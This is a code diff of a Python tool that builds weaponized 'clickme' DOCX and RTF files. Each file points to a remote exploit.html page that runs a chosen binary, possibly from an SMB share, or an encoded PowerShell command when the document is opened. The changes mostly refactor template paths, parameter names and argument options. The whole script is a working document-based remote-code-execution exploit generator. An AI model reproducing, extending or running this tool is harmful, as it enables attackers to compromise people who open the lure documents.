@@ -20,33 +20,33 @@ def zipdir(path, ziph):
                        ))
 
 
-def generate_docx(param_payload_url):
+def generate_docx(payload_url):
     const_docx_name = "clickme.docx"
 
     with open("src/document.xml.rels.tpl", "r") as f:
         tmp = f.read()
 
-    payload_rels = tmp.format(payload_url = param_payload_url)
+    payload_rels = tmp.format(payload_url = payload_url)
 
-    if not os.path.exists("src/clickme/word/_rels"):
-        os.makedirs("src/clickme/word/_rels")
+    if not os.path.exists("src/docx/word/_rels"):
+        os.makedirs("src/docx/word/_rels")
 
-    with open("src/clickme/word/_rels/document.xml.rels", "w") as f:
+    with open("src/docx/word/_rels/document.xml.rels", "w") as f:
         f.write(payload_rels)
 
     with zipfile.ZipFile(const_docx_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
-        zipdir("src/clickme", zipf)
+        zipdir("src/docx", zipf)
 
     print(f"Generated '{const_docx_name}' in current directory")
 
     
-def generate_rtf(param_payload_url):
+def generate_rtf(payload_url):
     const_rtf_name = "clickme.rtf"
 
-    with open("src/rtf/clickme.rtf", "r") as f:
+    with open("src/rtf/clickme.rtf.tpl", "r") as f:
         tmp = f.read()
 
-    payload_rtf = tmp.replace(const_rtf_payload, param_payload_url)
+    payload_rtf = tmp.replace('{payload_url}', payload_url) # cannot use format due to {} characters in RTF
 
     with open(const_rtf_name, "w") as f:
         f.write(payload_rtf)
@@ -62,14 +62,14 @@ if __name__ == "__main__":
     binary = parser.add_argument_group('Binary Execution Arguments')
     command = parser.add_argument_group('Command Execution Arguments')
     optional = parser.add_argument_group('Optional Arguments')
-    required.add_argument('-t', '--type', action='store', dest='type', choices={"docx", "rtf"},
-        help='The type of payload to use, can be "docx" or "rtf"', required=True)
     required.add_argument('-m', '--mode', action='store', dest='mode', choices={"binary", "command"},
         help='Execution mode, can be "binary" to load a (remote) binary, or "command" to run an encoded PS command', required=True)
     binary.add_argument('-b', '--binary', action='store', dest='binary', 
         help='The full path of the binary to run. Can be local or remote from an SMB share')
     command.add_argument('-c', '--command', action='store', dest='command',
         help='The encoded command to execute in "command" mode')
+    optional.add_argument('-t', '--type', action='store', dest='type', choices={"docx", "rtf"}, default="docx",
+        help='The type of payload to use, can be "docx" or "rtf"', required=True)
     optional.add_argument('-u', '--url', action='store', dest='url', default='localhost',
         help='The hostname or IP address where the generated document should retrieve your payload, defaults to "localhost". Disables web server if custom URL scheme or path are specified')
     optional.add_argument('-H', '--host', action='store', dest='host', default="0.0.0.0",
@@ -79,8 +79,7 @@ if __name__ == "__main__":
     args = parser.parse_args()
 
     payload_url = f"http://{args.url}:{args.port}/exploit.html"
-    const_rtf_payload = "XpayloadX"
-
+    
     if args.mode == "binary" and args.binary is None:
         raise SystemExit("Binary mode requires a binary to be specified, e.g. -b '\\\\localhost\\c$\\Windows\\System32\\calc.exe'")
 
